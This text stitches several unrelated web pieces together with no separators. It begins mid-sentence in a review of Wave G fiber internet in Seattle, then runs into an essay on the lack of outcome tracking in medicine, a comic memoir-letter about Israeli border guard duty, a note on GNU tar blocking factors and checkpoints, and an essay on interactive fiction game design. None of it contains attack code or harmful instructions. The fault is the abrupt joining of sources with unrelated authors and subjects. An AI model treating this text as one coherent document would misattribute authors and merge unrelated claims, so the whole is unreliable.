daily web tasks (yet).</p>

<p>While just under 1000 Mbps is the theoretical gigabit maximum, most web sites 
and cloud services aren’t going to be able to make full use of your connection 
in a sustained manner. Large files hosted on CDNs should be quick at least:</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/quick-windows-download.png" title="At least you can download Windows and Linux ISO images in a few minutes"></p>

<p>Having gigabit at least feels like a key requirement to experiment with 4K
content, keeping all your storage in the cloud, VR, and other up-and-coming 
advancements.</p>

<h2 id="wave-gs-network">Wave G’s network</h2>

<p>Once your home is connected to Wave G’s network, they have their own 
efficient gear that connects to their fiber, eventually peering with 
others inside data centers and nearby colo facilities like the 
<a href="https://www.westinbldg.com/">Westin Building Exchange (WBX)</a> and the 
<a href="https://www.seattleix.net/">Seattle Internet Exchange (SIX)</a>,
providing short hops and low latency. Buildings near ours connect to the 
10 Gbit fiber backhaul our building has underground using millimeter wave 
radios on the roof of our building.</p>

<p>This is where the original Condo Internet company took advantage of their
parent company, Spectrum Networks, and their wholesale bandwidth offerings and
connectivity.</p>

<p>From my home network, my CAT6 networked machines get sub-millisecond - to - 1ms
ping times to Google, Microsoft, and all the major modern Internet services, just 
a few hops away…</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/waveg-ping-times.png" title=""></p>

<h2 id="890-940-mbps-typical-test-speeds">890-940 Mbps typical test speeds</h2>

<p>Testing with <a href="http://www.speedtest.net/">SpeedTest.net</a> I’ll usually see 
download speeds between 850-950 Mbps depending on the test site selected, and 
interestingly, my upload speeds are usually measured consistently around 950 Mbps.</p>

<p>In my home, only wired equipment experiences the full potential of this
connectivity, since WiFi is very dense in my neighborhood - lots of interference 
means that devices individually often connect at a slower line rate.</p>

<p>According to Netflix’s <a href="https://fast.com/">fast.com</a>, when I recently checked, 
my connection was approximated to 920 Mbps. Fast.com does a nice job of 
estimating various data sources to find a number that represents how your 
Netflix experience should be.</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/netflix-fast.png" title="According to Netflix fast.com, the connection speed is approximately 920 Mbps."></p>

<h2 id="fiber-backbone">Fiber backbone</h2>

<p>While many buildings in Wave G’s network are connected by millimeter wave 
rooftop connections, our building has a 10G fiber connection. Our building also
has rooftop millimeter wave dishes to serve other nearby buildings that do not
have fiber runs.</p>

<p>If you look out from our tower’s roof toward Elliott Bay, you can see a few of
the other nearby buildings that we connect to:</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/other-buildings.jpg" title="A look toward Elliott Bay, highlighting microwave Internet rooftop connections as part of the neighborhood mesh network."></p>

<p>Turning around and facing downtown Seattle, looking across the Belltown
neighborhood, there are many rooftop sites, likely all part of the Wave G
network:</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/other-buildings2.jpg" title="Looking across the Belltown neighborhood, nearly every rooftop has microwave backhaul equipment."></p>

<p>Our roof has 6+ <a href="https://bridgewave.com/bw64/">BridgeWave 60GHz millimeter wave radios</a>.
Each of these antennas provides a 1 Gbps full-duplex encrypted link between locations,
essentially a large private mesh network.</p>

<p><img src="https://az414997.vo.msecnd.net/waz/2018network/rooftop-microwaves.jpg" title="Rooftop 60GHz microwave backhaul equipment."></p>

<p>In our building’s garage basement, that network connects to the 10 Gigabit 
backbone network that Spectrum networks and Wave G runs.</p>

<h2 id="static-ipv4-ipv6-blocks">Static IPv4, IPv6 blocks</h2>

<p>I don’t actually know the latest on this story (whether it’s a monthly or a
one-time charge now), but when I requested my static IP years ago, it was a one-time 
$15 fee for a static static IPv4 address, and now I also have my own IPv6 block.</p>

<p>When moving between buildings and units, I’ve needed to get a new static IP 
address, but have been happy with the great support experience in requesting 
those changes and coordinating my moves.</p>

<h2 id="great-tech-support">Great tech support</h2>

<p>I’ve never experienced a large outage, but when I was first setting up my
connection, due to the CAT3 wiring to my unit, I was only able to get 100 Mbps
connection to the carrier switch.</p>

<p>Wave G’s primary equipment has commercial UPS units present, and the switching
gear throughout the building runs off of the emergency generator circuit in
our building.</p>

<p>When I first moved to my condo, I had a tech come out to help me look into why 
I was only able to get a 100 Mbps connection, and in the end I learned a lot
about CAT3 and the heavy signal degradation I was experiencing. (More about my
CAT3 woes later in this post)</p>

<p>The tech even came out with a box of CAT5e cable in case we wanted to pull a new</p></div></div>

<p>By DAVID SHAYWITZ, MD</p>



<p>Medicine is plagued by a feedback gap, or perhaps more accurately, a feedback paradox.&nbsp;</p>



<p>On the one hand, clinicians are bombarded by feedback. Every day, there are a slew of process and billing metrics to review, providing an accounting of the volume of patients seen, and the intensity of each visit.&nbsp;</p>



<p>How thorough was the exam? What procedures may have been performed?&nbsp;</p>



<p>Even beyond the measures related to billing are an ever-growing number of measures related to guideline adherence. Doctors have an increasingly long set of questions to answer, boxes to check.</p>



<p>Did you ask about seatbelts use? Did you ask about home safety? Have you scheduled an eye exam for your patient with diabetes? These are often, individually, sensible and relevant considerations. In aggregate, however, they can be overwhelming and lead to guidance fatigue and ethical slippage, as Bill Gardner (<a href="http://theincidentaleconomist.com/wordpress/the-burden-of-checklists-and-the-importance-of-core-metrics/">here</a>) and Drs. David Blumenthal and J. Michael McGinnis (<a href="https://jamanetwork.com/journals/jama/article-abstract/2288464">here</a>) have discussed, and as I recently <a href="https://thebulwark.com/beware-of-guidance-fatigue/">reviewed</a> in the context of COVID-19.</p>



<p>Yet for all these metrics and assessments, what’s often lacking is any sense of how the patients are actually faring – the thing that matters most.&nbsp;</p>



<p>It’s not at all clear whether all the carefully documented and billed work is leading to improved outcomes for patients. Are there approaches for some patients that are leading to better outcomes than other approaches, and which could be generalized?&nbsp; Are there other approaches that should be abandoned?</p>



<p>The heart of the problem is how most clinical research is done. On the one hand, to demonstrate, scientifically, that a particular approach (whether a novel drug or a new approach to therapy, like <a href="https://www.thelancet.com/journals/lanres/article/PIIS2213-2600(20)30268-X/fulltext">placing sick COVID-19 patients on their stomachs</a> instead of their backs when they’re in the hospital) works, a clinical trial – ideally, a randomized, double-blind, placebo-controlled, to the extent possible – is performed. This is a highly choreographed exercise, where the exact characteristics of the subjects to be enrolled, the evaluations to be performed, and the criteria for success are all spelled out, clearly, in advance (or at least, ought to be). Enrolled subjects are tracked meticulously, and ultimately, you should be able to determine if the intervention was more effective than your control at achieving the pre-specified outcomes.&nbsp;</p>



<p>This is the way medical science advances – through rigorous clinical studies, and then the adoption of these results in clinical practice.</p>



<p>The <a href="https://ascpt.onlinelibrary.wiley.com/doi/10.1002/cpt.1382">conceit</a> of this approach is that the results from a rigorous clinical study will be widely generalizable, meaning that the patient you’re treating will respond like the subjects in the study, and the treatment you’re providing will mirror that offered in the study. &nbsp;</p>



<p>Of course, we all know side effects can emerge over time that weren’t seen in clinical trials, and we recognize that certain groups – women and minorities in particular – have historically been underrepresented in clinical trial populations. &nbsp;</p>



<p>To the extent that you accept the basic premise that a well-run clinical trial yields results that can guide care, then it makes sense for health systems to impose processes that try to ensure patients with a particular condition receive the treatment indicated by clinical trials.&nbsp;&nbsp;</p>



<p>This approach has given rise to the idea of “disease pathways,” that provide a &nbsp;template for managing patients with a particular condition, and the embrace of &nbsp;process metrics, that try to ensure doctors are following the updated guidance – rather than, say, doing what perhaps they’ve always done because it’s what they know.</p>



<p>In practice, there are two problems with this system: one stemming from doctors who disregard these pathways, the other related to doctors who adhere to them.</p>



<p>Many physicians (perhaps especially in august academic institutions) worry most about their colleagues, especially those who practice in the community.&nbsp;</p>



<p>These physicians are often presumed by their university colleagues to be less attuned to the latest scientific literature, and hence neither of relevant advances in care nor practicing in a setting that encourages them to do so. Consequently, their patients may not be receiving the most optimal care, and have no way of knowing it.</p>



<p>But a second category of challenge involves the physicians who are attuned to guidelines, perhaps because they closely follow the literature, or perhaps because their health system nudges them to adhere. While arguably the patients in the care of these physicians are on balance better off than those in the first group, there are still important challenges – and embedded opportunities.</p>



<p>For starters, subjects in clinical studies are notoriously unrepresentative of the more general population – enrolled subjects tend to be healthier and to have fewer co-existing conditions, in effort to enable a clearer evaluation of the intervention, and provide a sort of “best case” read-out.</p>



<p>In addition, subjects in trials tend to be followed unusually closely – they may be reminded to take their medicine, for example, and encouraged along the way by study staff.&nbsp; While inclusion of a placebo group controls for the therapeutic impact of the extra attention (known as the “Hawthorne Effect”), it doesn’t account for the combined effect of experimental intervention plus attention – the increased likelihood that a subject in a study will reliably take a given medicine, say, compared to a patient in a doctor’s office, where the <a href="https://www.nytimes.com/2002/07/16/health/improved-drug-regimens-help-patients-take-their-medicine.html">medication adherence rate</a> can be astonishingly low. (It’s also why tech-enabled health service companies that feature a strong coaching and tracking component, <a href="https://www.forbes.com/sites/davidshaywitz/2017/03/08/can-silicon-valley-cure-diabetes-with-low-carbs-and-high-tech/#2e86110f190a">like Omada and Virta</a>, have gained considerable traction.)</p>



<p>As UCSF’s Dr. Fred Kleinsinger <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6045499/">noted</a> in a 2018 publication:</p>



<p>“Medication nonadherence for patients with chronic diseases is extremely common, affecting as many as 40% to 50% of patients who are prescribed medications for management of chronic conditions such as diabetes or hypertension. This nonadherence to prescribed treatment is thought to cause at least 100,000 preventable deaths and $100 billion in preventable medical costs per year.”</p>



<p>Finally, some patients in clinical practice may actually respond better than expected to a particular intervention – perhaps because of an intrinsic characteristic (involving their genetics or their microbiome, for example), or perhaps because of something subtle a particular physician or care provider did, a tweak that might goose the patient along a little bit. These are opportunities to learn from “happy accidents,” to institutionalize serendipity, so to speak, and benefit from the ingenuity of inquisitive physicians (medicine’s <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6617976/">lead users</a>, to use von Hippel’s term) –opportunities that are easily missed in the course of routine care.</p>



<p>The common feature of all these clinical care scenarios is the almost complete absence of tracking the one thing that matters most – actual patient outcomes over the long term.&nbsp;&nbsp;</p>



<ul><li>How is the psychiatrist doing with her patients with depression?&nbsp;</li><li>How about the endocrinologist with his diabetics (in fairness, A1c is occasionally tracked)?</li><li>Is the neurologist getting average, worse, or better, results than expected for patients with multiple sclerosis? For which patients?</li></ul>



<p>A new medicine may get approved on the basis of robust clinical trials, but the approval of a drug, as I’ve <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6617976/">argued</a>, doesn’t necessarily equate with the improvement of outcomes of real world patients.</p>



<p>Why aren’t outcomes tracked in routine care the way they are in clinical trials? For one, it’s surprisingly hard to track patient journeys, especially as patients often get care from multiple medical systems – though even rigorously determining the outcome for a patient entirely within one medical system can be remarkably difficult, especially in the context of real life, when appointments are missed, and assessments can be spotty and inconsistent, and documentation unreliable.</p>



<p>But the second reason the information isn’t tracked is, essentially, no one (besides the patient!) really cares, in the sense of being personally invested in (and accountable for) the outcome. Certainly not in fee-for-service systems, where doctors (who, to be clear, obviously try their best for each patient) charge based on their activity rather than patient outcome. Hence, the extended push for approaches that seek to prioritize improved care, and specifically, improved outcomes. But even here it’s challenging – doctors will always argue that their specific patients are different – more complex or sicker, say, so of course they’ll do worse.&nbsp;</p>



<p>Often, the doctors may be right, and efforts to increase transparency around the success of certain surgical procedures has naturally led to notorious gaming of the system, where a mediocre heart surgeon who selects only the easiest cases scores higher than an exceptional surgeon who takes on the most difficult ones.&nbsp;</p>



<p>Attempts to adjust for complexity, inevitably, go only so far.</p>



<p>What emerges from this is a health system that, despite what may be the best intentions of providers, essentially, is flying blind, and lacks the basic ability to see what’s it doing, a system that lacks the fundamental ability to iteratively optimize and improve.&nbsp;</p>



<p>Yes, care improvement occurs – but over incredibly long periods of time, driven by the slow pace of robust clinical trials, rather than by the opportunities to systematically learn from patients and providers every single day.&nbsp;</p>



<p>For years, we’ve championed the concept of a “learning health system,” and today, it remains largely an unrealized aspiration.</p>



<p>What is to be done?</p>



<p>A remarkable recent two-day conference organized by Dr. Mark McClellan and colleagues at the Duke-Margolis Center (all materials available <a href="https://healthpolicy.duke.edu/events/establishing-high-quality-real-world-data-ecosystem-day-1-2">here</a>) dug into exactly this challenge, drilling into the question of whether there can be some kind of convergence between the process of …</p></div></article></div>

<p>Dear United States Customs and Border Protection, I was honored to receive your invitation to apply to the Border Patrol.</p>
<p>Not at first: at first I was bemused, and joked about this being the most mistargeted targeted ad in the history of the internet. After all, I represent a dramatic failure of your agency: an immigrant from the Middle East who infiltrated your nation, took your jobs, seduced your women, and <a href="https://putanumonit.com/2015/12/30/010-voting/" target="_blank" rel="noopener">undermined your democracy</a>. But perhaps that is your strategy — if I could beat you, let me join you.</p>
<p>But then I remembered: half a lifetime ago I did wear a uniform that gave me a purpose. I spent a good deal in that uniform patrolling a border. Perhaps I went beyond. You must be familiar with that time since your ad found me, but allow me to share some details anyway. A young man sees and learns many things while on guard duty.</p>
<p>My country is small, shaped like a long chef’s knife, and surrounded by hostile neighbors. It has a very high ratio of miles-of-border-that-need-to-be-watched to teenagers. So on any given day many of its teenagers are employed by watching its borders. Demand creates its own supply, as they say.</p>
<p>I just turned 18 when they gave me a rifle and two sets of uniforms. One crisp and clean that I would almost never wear, one grimy and rough and suitable for the work of infantry boot camp: running, push-ups, shooting, washing toilets, catching naps, guard duty.</p>

<p>Guard duty is no one’s main job in the army, but almost everyone has to do a lot of it throughout their service. It has a lot in common with Vipassana meditation — a quiet, solitary affair whose ultimate goal is “seeing”. One’s practice starts in boot camp doing 30 minute stints, then one graduates to practicing for 4 or 8 hours in a row and going on retreats.</p>
<p>I wish I knew about Vipassana when I enlisted, I surely would have been enlightened twice over for all the hours I spent standing guard. Instead, I mostly entertained myself by singing Russian pop songs in my head. I learned the lyrics to hundreds of those, along with the entire Marshall Mathers LP and an eclectic selection of French hip hop and German metal. It has always been my gift and curse: I have a perfect memory for song lyrics in any language, but I can’t carry a tune to save my life. I sing often to myself, but at karaoke I’m resigned to cringing as my vocally talented friends butcher the lyrics to what are supposedly their favorite tracks.</p>
<p>One night the list of shifts came out; I had the terrible fourth slot: 12:30-1:00 AM. It meant that I would just be falling asleep when the third shift would wake me to stand guard groggily, and afterward I wouldn’t have enough time to get a full night’s sleep before reveille at 5 AM. I climbed onto my field bed at 11 PM, sullen. I woke up at 5, confused.</p>
<p>The third shift never woke me up because the second shift guy never woke&nbsp;<em>him</em> up. Instead, the second shift got up at 11:30, went to the guard post, put his his uniform and rifle in a neat pile, climbed the fence, and set off in his boxers toward the southwest. Military police picked him up at sunrise, parched and exhausted, a couple of miles from the border with Egypt.</p>
<p>I never saw that guy again. I assume he was sent to military prison for a month or two until the cell had to be vacated for fresh offenders. Then he was discharged and let loose, having demonstrated to the army’s satisfaction that he is not fit to be a GI. Today he is probably eating falafel somewhere in Tel Aviv, reminiscing about the night he ran through the desert to allow me to a get a good night’s sleep.</p>

<p>Four years later, I was back at the Egyptian border for my final week-long guard retreat. No longer a fresh-faced recruit, I was a fresh-faced Sergeant First Class with a degree in mathematics. But guard duty doesn’t care about honorifics and academics, the border still needs watching.</p>
<p>This particular outpost consists of a small barracks with a bed and six bunks, a toilet, a fence, a gate in the fence, a tower. Around the fence the lone and level sands stretch far away, boundless and bare. The six soldiers are guarding 4/8: 4 hours at the gate, 8 hours to sleep, 4 hours at the tower, 8 hours to play cards or backgammon. Repeat x7 and you’re done. The officer is usually sleeping 12 hours a day and reading weeks-old magazines left by previous rotations of guards.</p>
<p>Aside from your six fellow men, the only living beings you’d see are one fox and twenty billion flies. <span>The Egyptians guard towers and patrol routes are out of sight. The Bedouin smugglers, transporting drugs from Latin America and prostitutes from Eastern Europe and contraband from Asia, know exactly where the outposts are and easily avoid them. If you think you see someone while on tower duty, you can assume that you’re hallucinating from the heat.</span></p>
<p>The first five days passed uneventful. The officer was chill, and the daily inspection consisted of little more than making sure the number of soldiers and rifles stayed at six. I passed the 8 AM – noon slot at the gate solving math puzzles in my head. I spent the 8 PM – midnight tower watch listening to music in one earphone, the ear that wasn’t visible from the barracks.</p>
<p>At 1 AM on Friday I just tucked in to bed when the radio suddenly came alive.</p>
<p><span>– “Base, this is tower. I see three figures approaching from the west.” </span></p>
<p><span>– “Everyone up! Tower, do you see weapons?” </span></p>
<p><span>– “Negative, sir. I turned the spotlight on them and they froze and lay still.” </span></p>
<p><span>– “Stay on them and look for more hostiles. Everyone wake the fuck up and get your fucking gear!”</span></p>
<p><span>– “Base, they’re standing up.”</span></p>
<p>– “Take cover, soldier! What are they doing?”</p>
<p>– “Sir, the’re shouting and hugging each other. One of them is dancing. I think the other one is praying.”</p>
<p>It turned out that the three men we<span>re refugees from Darfur, having just walked the last mile of a 3,000 mile trek. The South Sudanese make their way north across Sudan to the Sudan-Egypt border, then they pay everything they own for smugglers to take them across Egypt to Israel. </span></p>
<p><span>But the Egyptian Army patrols the Israeli border, and the smugglers don’t want to get close to it. T</span><span>hey drop the refugees ten miles from Israel and tell them: “Keep walking east, you’ll be fine. Unless the Egyptians see you, then they’ll probably shoot you. But if you don’t get shot, you’ll be in Israel before dawn. Inshallah!”</span></p>
<p><span>So when the three dudes got spotted but no one was shooting, they knew that they had made it to the promised land. As the other guys stood in a circle “guarding” the three thin men in ragged clothes, I went to the barracks to get them sandwiches and the cold bottle of Coke we were saving for Saturday. Half an hour later a military police jeep picked them up.</span></p>
<p><span>I don’t know what happened to them afterward. Most likely they were sent to a detention center for a week or two until the cell had to be vacated for fresh refugees. Then they were discharged and let loose. Today they are probably washing dishes at a falafel joint somewhere in Tel Aviv, reminiscing about the night they ran through the desert to prevent me from getting a good night’s sleep.</span></p>

<p>There are many other stories I could tell you, my dear United States Customs and Border Protection agency. The time I was guarding in the West Bank and spent the week smoking shisha with an Arab friend. The time I guarded the border with Lebanon during the war, when what kept me alert were the rockets and artillery instead of the usual threat of being written up by a stickler officer for slouching. The time I was guarding a checkpoint and saw first-hand that the politics of Israel and Palestine you read about in the New York Times have less than nothing to do with how Israelis and Palestinians actually live together and deal with each other in that small patch of land. The time that other guy went on guard duty and didn’t come back.</p>
<p>But I think I have made a strong enough case for my application. I spent four years watching the border, and the border was still there when I left. I never ran half-naked into the desert. I only dozed off once or twice, and was never caught. The one time people came across the border illegally we let them in and I gave them sandwiches, but in my defense it wasn’t my watch anyway and the looked real hungry.</p>
<p>I look forward to hearing back from you about my candidacy,</p>
<p>Kind regards,</p>
<p>Jacob</p>

<h2>Afterword – Memoirs</h2>
<p>I recently finished reading Sasha Chapin’s memoir&nbsp;<a href="https://www.goodreads.com/en/book/show/43062156"><em>All the Wrong Moves</em></a> and realized that in five years of blogging I’ve shared few stories from my own life, which has been at least as eventful as Sasha’s. I’m somewhat tempted to write a memoir, probably focused on all the dates I went on and what I learned from them about men, women, and myself. I wrote this post in part to practice that style of writing: a narrative history with plenty of asides and jokes. I am curious to know if there is any appetite among my readers for this, given that if I start working on a memoir I will have less time to write regular Putanumonit updates.</p>

    <p>I wish it were not so, but the <a href="https://www.gnu.org/software/tar/manual/">GNU tar manual</a> is not always easy to parse, nor is it necessarily complete on all topics.</p>
    <p>A common impediment to effectively using GNU <code>tar</code> wth modern tape drives is understanding how to use the <a href="https://www.gnu.org/software/tar/manual/html_section/tar_76.html">blocking factor</a> and <a href="https://www.gnu.org/software/tar/manual/html_section/tar_26.html">checkpoint</a> features.
    </p><h2>Blocking factor</h2>
    <p>First, let's define some terms as they are used with GNU <code>tar</code> in increasing order of abstraction:</p>
    <dl>
    <dt>block</dt><dd>A <em>block</em> in GNU <code>tar</code> is a unit of data that is 512 bytes long, regardless of what "block size" might mean for any underlying storage devices.</dd>
    <dt>record</dt><dd><em>records</em> are composed of one or more <em>blocks</em>. In a given archive the number of <em>blocks</em> in each <em>record</em> is set by the <em>blocking factor</em>. When tar writes to an archive file (or through a pipe, to a tape etc) it always writes one full <em>record</em> at a time.</dd>
    <dt>input file</dt><dd>When an <em>input file</em> is read by <code>tar</code> to be stored in an archive it is converted to a sequence of one or more <em>records</em>. The number of <em>records</em> needed depends on how large the file is, but there will always be at least one whole <em>record</em> for every file.</dd>
    </dl>
    <p>The current default blocking factor of GNU <code>tar</code> is <code>20</code>, though you can verify this with your own installation:</p>
    <pre>$ tar --show-defaults
--format=gnu -f- <strong>-b20</strong> --quoting-style=escape ...
</pre>

    <p>By multiplying the default blocking factor of <code>20</code> by the size of one block in bytes, we can tell that <code>tar</code> will write to our tape 10240 bytes at a time, or 10 KiB at a time.</p>
    <p>This may have made sense in the distant past and with tape drives that expected to be sent data in specific record sizes, however modern LTO-7 tape drives should be written at around 300 MiB per second for maximum efficiency. At the default blocking factor this means tar would have to finish a record and start a new one every 0.03 milliseconds or so.</p>
    <p>Modern drives also accept a wide range of "block sizes" for writes, presumably these no longer strongly correspond to the physical layout of the tape media:</p>
    <pre># dmesg -t | grep "Block limits"
st 6:0:1:0: [st0] Block limits 1 - 8388608 bytes.</pre>
    <p>Increasing the blocking factor (option <code>-b</code>) to <code>1024</code> or <code>2048</code> when creating tape archives with GNU <code>tar</code> and modern tape drives results in a dramatic improvement in throughput and makes it much easier to hit the desired 300 MiB per second data rate. This corresponds to a record size of 512 KiB or 1 MiB respectively.</p>
    <p>As with any storage throughput optimisation it is important to benchmark all changes to ensure they result in a real-world improvement, though <code>1024</code> is probably a good place to start with tests.</p>
    <h2>Checkpoints</h2>
    <p>Because <code>tar</code> operations may be long running, it can be useful to have feedback about progress during the operation.</p>
    <p>GNU <code>tar</code> has a few methods to provide this feedback however for integrating <code>tar</code> in to large operations (e.g. a backup management system) the <code>exec</code> method provides a lot of flexibility.</p>
    <p>This method will cause <code>tar</code> to execute an external program at periodic intervals while operating, and set certain environment variables with information about the state of progress.</p>
    <p>The <code>TAR_CHECKPOINT</code> environment variable is just documented as being the "number of the checkpoint", the exact meaning of which is amibiguous.</p>
    <p>As far as I can tell from reading the source code (invocations in <code>src/buffer.c</code> of <code>checkpoint_run()</code> which increments the <code>checkpoint</code> variable) <code>TAR_CHECKPOINT</code> is incremented for every <code>record</code> written, so to convert from a <code>checkpoint number</code> to bytes written or read:</p>
    <blockquote>With the default blocking factor of <code>20</code>, and checkpoints configured for every <code>100</code> records, the 1st checkpoint will be <code>checkpoint 100</code>, at which time 1013760 bytes (99 records of 20 blocks each) has been written. The second checkpoint will be <code>200</code>, at which time 2037760 bytes will have been written, and so on.</blockquote>
    <p>Or, more succinctly:</p><blockquote><code>bytes_written_or_read = (checkpoint_number - 1) * blocking_factor * 512</code></blockquote>

<blockquote><p>“The window is closed, so you can’t go inside.”</p></blockquote>



<p>This is the entirety of the opening to Andrew Plotkin’s <em><a href="https://www.eblong.com/zarf/if.html#sutwin" target="_blank" rel="noreferrer noopener">The Space Under the Window</a></em>, a game that continues to inspire me twenty plus years on. (Twenty plus years? I just turned to dust.) The spirit of its teasing opacity is clearly present in <em>Her Story’s</em> opening onto a plain computer desktop with the single word ‘murder’. This aggressively prosaic and unwelcoming opening avoids welcoming the player in the way that almost all videogames do. The better to inflame their curiosity? I have the purest love for games that start with knotted up little puzzle boxes and force their players to start touching, feeling, tapping at them to figure out what to do to reveal their contents.&nbsp;</p>



<p>Plotkin and I share an appreciation for the <em>Myst</em> games and there’s some analogue there to the way those games present machinery and ask you to play with it to infer how it works. Except here the machine is a poem and the prodding is all about words rather than buttons or levers. </p>



<div data-ghostkit-styles=".nk-awb-Z1RPKiv { padding-top: 100px; padding-bottom: 100px; }"><div data-awb-type="image" data-awb-image-background-size="cover" data-awb-image-background-position="50% 50%" data-awb-parallax="scroll" data-awb-parallax-speed="0.5" data-awb-parallax-mobile="false"><p><img loading="lazy" src="http://halfmermaid.co/wp-content/uploads/2020/08/bpjc00ez5sgy.jpg" width="1267" height="817" srcset="https://halfmermaid.co/wp-content/uploads/2020/08/bpjc00ez5sgy.jpg 1267w, https://halfmermaid.co/wp-content/uploads/2020/08/bpjc00ez5sgy-300x193.jpg 300w, https://halfmermaid.co/wp-content/uploads/2020/08/bpjc00ez5sgy-1024x660.jpg 1024w, https://halfmermaid.co/wp-content/uploads/2020/08/bpjc00ez5sgy-768x495.jpg 768w, https://halfmermaid.co/wp-content/uploads/2020/08/bpjc00ez5sgy-500x322.jpg 500w, https://halfmermaid.co/wp-content/uploads/2020/08/bpjc00ez5sgy-800x516.jpg 800w" sizes="(max-width: 1267px) 100vw, 1267px"></p></div></div>



<p>If you haven’t played <em>The Space Under the Window</em> (<a href="https://www.eblong.com/zarf/if.html#sutwin" target="_blank" rel="noreferrer noopener">go do it!</a>) here’s Plotkin explaining how to play:</p>



<blockquote><p>Your part is to type the names of objects (or attributes or aspects of objects) that you see in the narrative. When you refer to an object, it will be brought into greater prominence, changing the course of the narrative thread. Or it might be reduced to lesser stature, or removed entirely. You’ll have to experiment. Typing the same name second time may cancel the effect of the first time, or the effect may be cumulative. The order in which you type names may or may not be important.</p></blockquote>



<p>So, for example, we start with</p>



<blockquote><p>The window is closed, so you can’t go inside.</p></blockquote>



<p>And I type “window”</p>



<blockquote><p>The window is open, so you can go into the room.</p></blockquote>



<p>Wow! I’ve opened and closed a lot of doors and windows in my years of videogaming, but always as an avatar manipulating the world directly.  Doing it by drawing attention to the object and having the narrative morph around it — <em>that felt magical</em>!</p>



<div data-ghostkit-styles=".nk-awb-Z1zWbzI { padding-bottom: 100px; padding-left: 10px; padding-top: 100px; padding-right: 10px; }"><div data-awb-type="image" data-awb-image-background-size="cover" data-awb-image-background-position="100% 45%" data-awb-parallax="scroll" data-awb-parallax-speed="0.5" data-awb-parallax-mobile="false"><p><img loading="lazy" src="http://halfmermaid.co/wp-content/uploads/2020/08/Hopper-Sun-in-an-Empty-Room-ED-5b06240e3de4230039da12f7.jpg" width="2000" height="1448" srcset="https://halfmermaid.co/wp-content/uploads/2020/08/Hopper-Sun-in-an-Empty-Room-ED-5b06240e3de4230039da12f7.jpg 2000w, https://halfmermaid.co/wp-content/uploads/2020/08/Hopper-Sun-in-an-Empty-Room-ED-5b06240e3de4230039da12f7-300x217.jpg 300w, https://halfmermaid.co/wp-content/uploads/2020/08/Hopper-Sun-in-an-Empty-Room-ED-5b06240e3de4230039da12f7-1024x741.jpg 1024w, https://halfmermaid.co/wp-content/uploads/2020/08/Hopper-Sun-in-an-Empty-Room-ED-5b06240e3de4230039da12f7-768x556.jpg 768w, https://halfmermaid.co/wp-content/uploads/2020/08/Hopper-Sun-in-an-Empty-Room-ED-5b06240e3de4230039da12f7-1536x1112.jpg 1536w, https://halfmermaid.co/wp-content/uploads/2020/08/Hopper-Sun-in-an-Empty-Room-ED-5b06240e3de4230039da12f7-500x362.jpg 500w, https://halfmermaid.co/wp-content/uploads/2020/08/Hopper-Sun-in-an-Empty-Room-ED-5b06240e3de4230039da12f7-800x579.jpg 800w, https://halfmermaid.co/wp-content/uploads/2020/08/Hopper-Sun-in-an-Empty-Room-ED-5b06240e3de4230039da12f7-1280x927.jpg 1280w, https://halfmermaid.co/wp-content/uploads/2020/08/Hopper-Sun-in-an-Empty-Room-ED-5b06240e3de4230039da12f7-1920x1390.jpg 1920w" sizes="(max-width: 2000px) 100vw, 2000px"></p></div></div>



<p>Focus further on the window with a second “window” and the narrative morphs again, expanding hidden layers like zooming into a Mandelbrot fractal.&nbsp;</p>



<blockquote><p>The window is open, one pane laid back. As always, you strain to see what lies in the room below, and fail — there is only tinted glass, and the darkness of the opening.</p></blockquote>



<p>If instead of the second window I’d gone for “room”, we’d have got&nbsp;</p>



<blockquote><p>The window is open, so you climb down inside. The table is set for two.</p></blockquote>



<p>Wow! Way to add more narrative importance to that room! But back to where we were, at:</p>



<blockquote><p>The window is open, one pane laid back. As always, you strain to see what lies in the room below, and fail — there is only tinted glass, and the darkness of the opening.</p></blockquote>



<p>I type “glass” and</p>



<blockquote><p>The window is open, one pane laid back. As always, you strain to see what lies below, and fail. There is only tinted glass over darkness… and the reflection of your face.</p></blockquote>



<p>Now the glass is very close to the heart of the narrative — reflecting my face! The room has shrunk out of the narrative, shifting the focus of the text.</p>



<p>I hit up “face” and we get</p>



<blockquote><p>The window is open, one pane laid back. As always, you strain to see what lies below, and fail. There is only tinted glass over darkness….</p><p>And the reflection of your face, traced dark against the blue-black sky. You are caught, suddenly, by your own eyes.</p></blockquote>







<p>Now “eyes” because of course. And we get</p>



<blockquote><p>The window is open, one pane laid back. As always, you strain to see what lies in the room below, and fail. There is only tinted glass over darkness.  </p><p>…And the reflection of your face, traced dark against the blue-black sky. You are caught, suddenly, by your own eyes — dark and impenetrable, flat and hard as the glass they reflect in.</p></blockquote>







<p>I’ll stop here because I don’t want to rob anyone of the joy of this experience. But look, this thing is so damn clever and amazing to me. What do I like?</p>



<ul><li>It’s a story with execution and craft and language. Because it’s text there’s some interiority and nuance there</li><li>I interact with the medium (text) on a level which is in and of the thing — I read words and use words to play. No layers of abstraction between the thing and my player magic</li><li>The fractal zoom feel — what I love about digital is that things can emerge from inside things, or out of pockets of nothing — we’re not bound by physical constraints like almost every other traditional medium</li><li>The free associative quality — I feel like I’m in a dialogue with the game, throwing the ball back and forth</li></ul>







<p>What I took to heart the most was the idea of a story starting from a small, hard kernel and then blossoming, unfurling like a flower at my touch. <em>The sheer excitement of objects and their attributes being the focus of my player powers.</em> It’s one thing to whack a new object in a whacking things game, but, here, to see a new object enter the narrative with all of its naturally inherited weight and value (“eyes”, “face”!) is exciting because — <em>Yes! I want to point magic at </em><strong><em>that! </em></strong>Simply I love a game where instead of a layer of abstraction obscuring 1s and 0s (a flower might be a 1 that I can turn into a 0 by whacking it) the object is possessed of all the value of that object and this is only accentuated by my interacting with it.&nbsp;</p>



<p><a href="https://store.steampowered.com/app/1350200/Project_A/" target="_blank" rel="noreferrer noopener"><span>Project A███████</span></a> is (as with&nbsp; I guess a few other of my games?!) about looking. It’s about watching movies and how movies tell their stories with images. I want to make something where an image is excitingly <em>the thing </em>rather than just a thing shaped 1 or 0.</p>



<hr>



